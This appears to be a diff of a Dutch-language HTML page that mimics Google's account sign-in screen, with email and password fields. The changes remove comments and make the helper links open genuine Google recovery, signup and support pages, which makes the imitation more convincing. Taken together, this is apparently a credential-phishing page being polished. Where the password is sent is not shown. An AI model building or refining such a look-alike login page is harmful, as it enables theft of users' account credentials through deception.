@@ -21,7 +21,6 @@
         h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
         p { font-size: 16px; color: #202124; margin: 0 0 40px 0; }
 
-        /* Input styling */
         .input-group { position: relative; margin-bottom: 10px; text-align: left; }
         input { 
             width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; 
@@ -29,7 +28,6 @@
         }
         input:focus { border: 2px solid #1a73e8; }
         
-        /* Account weergave */
         .account-pill {
             display: inline-flex; align-items: center; padding: 3px 12px 3px 5px;
             border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px;
@@ -38,16 +36,16 @@
         .account-pill:hover { background-color: #f8f9fa; }
         .avatar { background: #5f6368; color: white; width: 20px; height: 20px; border-radius: 50%; font-size: 12px; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
 
-        /* Knoppen & Links */
         .footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 40px; }
-        .blue-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
+        .blue-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; padding: 0; }
+        .blue-link:hover { text-decoration: underline; }
+        
         button { 
             background-color: #1a73e8; color: white; border: none; 
             padding: 10px 24px; border-radius: 4px; font-size: 14px; 
             font-weight: 500; cursor: pointer;
         }
 
-        /* De blauwe laadlijn van Google */
         .loading-bar { 
             position: absolute; top: 0; left: 0; width: 0%; height: 4px; 
             background: #1a73e8; transition: width 0.4s ease; 
@@ -69,13 +67,13 @@
                 <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer" required>
             </div>
             <div style="text-align: left; margin-top: 8px;">
-                <span class="blue-link">E-mailadres vergeten?</span>
+                <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/usernamerecovery', '_blank')">E-mailadres vergeten?</button>
             </div>
             <p style="text-align: left; font-size: 14px; color: #5f6368; margin-top: 40px;">
-                Geen eigen computer? Gebruik een gastvenster om privé in te loggen. <span class="blue-link">Meer informatie</span>
+                Geen eigen computer? Gebruik een gastvenster om privé in te loggen. <button type="button" class="blue-link" onclick="window.open('https://support.google.com/chrome/answer/6130773', '_blank')">Meer informatie</button>
             </p>
             <div class="footer">
-                <span class="blue-link">Account maken</span>
+                <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signup', '_blank')">Account maken</button>
                 <button onclick="toPassword()">Volgende</button>
             </div>
         </div>
@@ -94,10 +92,10 @@
                     <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
                 </div>
                 <div style="text-align: left; margin-top: 8px;">
-                    <input type="checkbox" id="showPass"> <label for="showPass" style="font-size: 14px;">Wachtwoord weergeven</label>
+                    <input type="checkbox" id="showPass"> <label for="showPass" style="font-size: 14px; cursor: pointer;">Wachtwoord weergeven</label>
                 </div>
                 <div class="footer">
-                    <span class="blue-link">Wachtwoord vergeten?</span>
+                    <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/recovery', '_blank')">Wachtwoord vergeten?</button>
                     <button type="submit">Volgende</button>
                 </div>
             </form>
